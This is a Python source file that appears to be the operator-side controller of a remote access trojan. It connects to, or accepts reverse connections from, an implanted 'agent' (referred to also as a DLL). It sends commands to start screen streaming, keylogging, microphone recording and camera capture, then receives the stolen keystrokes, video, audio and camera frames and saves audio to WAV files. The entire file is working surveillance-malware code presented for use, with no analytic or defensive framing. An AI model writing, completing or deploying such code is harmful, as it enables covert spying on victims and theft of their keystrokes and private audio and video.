import socket
import threading
import time
import struct
import os
import wave
try:
    import pyaudio
except ImportError:
    pyaudio = None

class TCPVideoClient:

    PKT_HEARTBEAT = 0x01
    PKT_HEARTBEAT_ACK = 0x02
    PKT_VIDEO_FRAME = 0x03
    PKT_KEYLOG_DATA = 0x04
    PKT_COMMAND = 0x05
    PKT_COMMAND_ACK = 0x06
    
    def __init__(self, agent_ip, port=443):
        self.agent_ip = agent_ip
        self.port = port
        self.socket = None
        self.running = False
        self.streaming = False
        self.video_callback = None
        self.keylog_callback = None
        self.receive_thread = None
        self.heartbeat_thread = None
        self.session_active = False
        self.last_heartbeat = time.time()


    @classmethod
    def from_socket(cls, sock: socket.socket, agent_ip: str = "reverse") -> "TCPVideoClient":

        obj = cls.__new__(cls)
        obj.agent_ip = agent_ip
        obj.port = 0
        obj.socket = sock
        obj.running = True
        obj.streaming = False
        obj.video_callback = None
        obj.keylog_callback = None
        obj.session_active = True
        obj.last_heartbeat = time.time()

        obj.receive_thread = threading.Thread(target=obj._receive_frames, daemon=True)
        obj.receive_thread.start()

        obj.heartbeat_thread = threading.Thread(target=obj._heartbeat_monitor, daemon=True)
        obj.heartbeat_thread.start()

        time.sleep(0.3)
        print(f"CLIENT: from_socket() — reverse connection active ({agent_ip})")
        return obj

        
    def connect(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            
            print(f"CLIENT: Connecting to {self.agent_ip}:{self.port}...")
            self.socket.connect((self.agent_ip, self.port))
            
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            if hasattr(socket, 'SIO_KEEPALIVE_VALS'):
                self.socket.ioctl(
                    socket.SIO_KEEPALIVE_VALS,
                    (1, 10000, 3000)
                )
            
            self.socket.settimeout(None)
            self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            self.running = True
            self.session_active = True
            self.last_heartbeat = time.time()
            
            print(f"CLIENT: ✓ Connected to agent at {self.agent_ip}:{self.port}")
            
            self.receive_thread = threading.Thread(target=self._receive_frames, daemon=True)
            self.receive_thread.start()
            
            self.heartbeat_thread = threading.Thread(target=self._heartbeat_monitor, daemon=True)
            self.heartbeat_thread.start()
            
            time.sleep(0.5)
            
            print("CLIENT: Background threads started and connection is stable")
            
            return True
            
        except ConnectionRefusedError:
            print(f"ERROR: Agent refused connection on {self.agent_ip}:{self.port}")
            return False
        except socket.timeout:
            print(f"ERROR: Connection timeout to {self.agent_ip}:{self.port}")
            return False
        except Exception as e:
            print(f"ERROR: Connection failed: {e}")
            import traceback
            traceback.print_exc()
            return False

    def test_connection(self):

        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(3)
            result = test_sock.connect_ex((self.agent_ip, self.port))
            test_sock.close()
            if result == 0:
                print("✓ Port is OPEN and reachable")
                return True
            else:
                print(f"✗ Port is CLOSED or filtered (error code: {result})")
                return False
        except Exception as e:
            print(f"Connection test failed: {e}")
            return False
 
    def send_packet(self, pkt_type, data=b""):
        if not self.socket or not self.session_active:
            return False
        try:
            header = struct.pack('!BI', pkt_type, len(data))
            self.socket.send(header + data)
            return True
        except Exception as e:
            print(f"ERROR: Send packet error: {e}")
            return False
    
    def send_command(self, cmd):
        return self.send_packet(self.PKT_COMMAND, cmd.encode('utf-8'))
    
    def start_stream(self):
        if self.send_command("START_STREAM"):
            self.streaming = True
            print("STREAM: 'Start' command sent")
            return True
        return False
    
    def stop_stream(self):
        self.streaming = False
        if self.send_command("STOP_STREAM"):
            print("STREAM: 'Stop' command sent")
            return True
        return False
    
    def start_keylogger(self):
        if self.send_command("START_KEYLOG"):
            print("KEYLOGGER: 'Start' command sent")
            return True
        return False
    
    def stop_keylogger(self):
        if self.send_command("STOP_KEYLOG"):
            print("KEYLOGGER: 'Stop' command sent")
            return True
        return False
    
    def close_session(self):
        if self.send_command("CLOSE_SESSION"):
            print("SESSION: 'Close' command sent")
            time.sleep(0.5)
            return True
        return False
    
    def unload_dll(self):
        return self.close_session()
    
    def _receive_frames(self):
        print("STREAM: Packet receiver thread started")
        
        try:
            while self.running and self.session_active:
                try:
                    first_byte = self._recv_exact(1)
                    if not first_byte:
                        print("STREAM: Connection closed by agent")
                        break
                    
                    pkt_type = first_byte[0]
                    
                    if pkt_type == self.PKT_HEARTBEAT:
                        timestamp_data = self._recv_exact(4)
                        if not timestamp_data:
                            break
                        self._handle_heartbeat()
                        continue
                    
                    size_data = self._recv_exact(4)
                    if not size_data:
                        print("STREAM: Failed to receive size header")
                        break
                    
                    pkt_size = struct.unpack('!I', size_data)[0]
                    
                    pkt_name = {
                        0x01: "HEARTBEAT",
                        0x02: "HEARTBEAT_ACK", 
                        0x03: "VIDEO_FRAME",
                        0x04: "KEYLOG_DATA",
                        0x05: "COMMAND",
                        0x06: "COMMAND_ACK",
                        0x07: "AUDIO_DATA",
                        0x08: "CAMERA_FRAME"
                    }.get(pkt_type, f"UNKNOWN_{pkt_type:02x}")
                    
                    print(f"STREAM: Received {pkt_name} ({pkt_size} bytes)")
                    
                    pkt_data = self._recv_exact(pkt_size) if pkt_size > 0 else b""
                    if pkt_size > 0 and not pkt_data:
                        print(f"STREAM: Failed to receive {pkt_size} bytes of data")
                        break
                    
                    if pkt_type == self.PKT_VIDEO_FRAME and self.streaming:
                        self._handle_video_frame(pkt_data)
                    elif pkt_type == self.PKT_KEYLOG_DATA:
                        self._handle_keylog_data(pkt_data)
                    elif pkt_type == self.PKT_COMMAND_ACK:
                        self._handle_command_ack(pkt_data)
                    elif pkt_type == 0x07:
                        self._handle_audio_data(pkt_data)
                    elif pkt_type == 0x08:
                        self._handle_camera_frame(pkt_data)
                    else:
                        print(f"STREAM: Unhandled packet type: {pkt_type:02x}")
                
                except Exception as e:
                    if self.running and self.session_active:
                        print(f"STREAM: Receive error: {e}")
                        import traceback
                        traceback.print_exc()
                    break
                        
        except Exception as e:
            if self.session_active:
                print(f"STREAM: Fatal error: {e}")
                import traceback
                traceback.print_exc()
        finally:
            self.session_active = False
            print("STREAM: Packet receiver ended")
    
    def _handle_heartbeat(self):
        self.last_heartbeat = time.time()
        try:
            self.send_packet(self.PKT_HEARTBEAT_ACK, b"")
            print(f"STREAM: ACK Signal Heartbeat sent")
        except Exception as e:
            print(f"STREAM: Failed to send ACK Signal Heartbeat: {e}")
    
    def _handle_video_frame(self, frame_data):
        if self.video_callback:
            self.video_callback("tcp_stream", 0, frame_data)
    
    def _handle_keylog_data(self, key_data):
        if self.keylog_callback:
            try:
                key_str = key_data.decode('utf-8', errors='ignore')
                self.keylog_callback("keystroke", key_str)
            except Exception as e:
                print(f"KEYLOGGER: Decode error: {e}")
    
    def _handle_command_ack(self, ack_data):
        ack_msg = ack_data.decode('utf-8', errors='ignore')
        print(f"STREAM: Command ACK: {ack_msg}")
        
    def _handle_audio_data(self, audio_data):
        if hasattr(self, 'audio_client_ref') and self.audio_client_ref:
            self.audio_client_ref.process_audio_packet(audio_data)

    def _handle_camera_frame(self, frame_data):
        if hasattr(self, 'camera_client_ref') and self.camera_client_ref:
            self.camera_client_ref.process_camera_frame(frame_data)
    
    def _heartbeat_monitor(self):
        print("STREAM: Heartbeat monitor started")
        while self.running and self.session_active:
            time.sleep(3) 
            if time.time() - self.last_heartbeat > 20:
                print("STREAM: Heartbeat timeout - connection lost")
                self.session_active = False
                break
        print("STREAM: Heartbeat monitor ended")
    
    def _recv_exact(self, num_bytes):
        data = b''
        start_time = time.time()
        timeout = 30

        while len(data) < num_bytes:
            try:
                if time.time() - start_time > timeout:
                    print(f"STREAM: Timeout receiving {num_bytes} bytes (got {len(data)})")
                    return None
                remaining = num_bytes - len(data)
                chunk = self.socket.recv(min(remaining, 8192))
                if not chunk:
                    print(f"STREAM: Connection closed while receiving (got {len(data)}/{num_bytes})")
                    return None
                data += chunk
            except socket.timeout:
                print(f"STREAM: Socket timeout (received {len(data)}/{num_bytes} bytes)")
                return None
            except Exception as e:
                print(f"STREAM: Receive error: {e}")
                return None
        return data
    
    def set_video_callback(self, callback):
        self.video_callback = callback
    
    def disconnect(self):
        self.running = False
        self.session_active = False
        
        if self.socket:
            try:
                self.socket.shutdown(socket.SHUT_RDWR)
                self.socket.close()
            except:
                pass
            self.socket = None
        
        print("STREAM: Disconnected")


class AudioClient:
    
    PKT_AUDIO_DATA = 0x07
    PKT_COMMAND = 0x05
    PKT_COMMAND_ACK = 0x06
    
    def __init__(self, shared_video_client):
        self.video_client = shared_video_client
        self.recording = False
        self.audio_file = None
        self.callback = None
        
        if pyaudio is None:
            raise RuntimeError("pyaudio is not installed. Run: pip install pyaudio")
        self.p = pyaudio.PyAudio()
        self.stream = None
        
    def start_recording(self):
        if not self.video_client or not self.video_client.session_active:
            return False
        
        if self.video_client.send_command("START_AUDIO"):
            print("AUDIO: Recording start command sent")
            
            try:
                self.stream = self.p.open(
                    format=pyaudio.paInt16,
                    channels=2,
                    rate=44100,
                    output=True
                )
            except Exception as e:
                print(f"AUDIO: Could not open speaker stream: {e}")

            timestamp = time.strftime("%Y%m%d_%H%M%S")
            script_dir = os.path.dirname(os.path.abspath(__file__))
            audio_dir = os.path.join(script_dir, "output", "recordings")
            os.makedirs(audio_dir, exist_ok=True)
            
            filepath = os.path.join(audio_dir, f"audio_{timestamp}.wav")
            self.audio_file = wave.open(filepath, 'wb')
            self.audio_file.setnchannels(2)
            self.audio_file.setsampwidth(2)
            self.audio_file.setframerate(44100)
            
            self.recording = True
            
            if self.callback:
                self.callback("started", filepath)
            
            return True
        return False
    
    def stop_recording(self):
        if not self.video_client:
            return False
        
        self.recording = False
        
        if self.stream:
            try:
                self.stream.stop_stream()
                self.stream.close()
            except:
                pass
            self.stream = None
        
        if self.audio_file:
            filepath = self.audio_file._file.name if hasattr(self.audio_file, '_file') else "audio file"
            try:
                self.audio_file.close()
            except Exception as e:
                print(f"AUDIO: Error closing file: {e}")
            self.audio_file = None 
            
            if self.callback:
                self.callback("stopped", filepath)
        
        if self.video_client.send_command("STOP_AUDIO"):
            print("AUDIO: Recording stopped")
            return True
        return False
    
    def process_audio_packet(self, audio_data):
        if self.recording:
            if self.stream:
                try:
                    self.stream.write(audio_data)
                except Exception as e:
                    print(f"AUDIO: Playback error: {e}")
            if self.audio_file:
                try:
                    self.audio_file.writeframes(audio_data)
                except Exception as e:
                    print(f"AUDIO: Write error: {e}")
    
    def set_callback(self, callback):
        self.callback = callback

    def __del__(self):
        if hasattr(self, 'p'):
            self.p.terminate()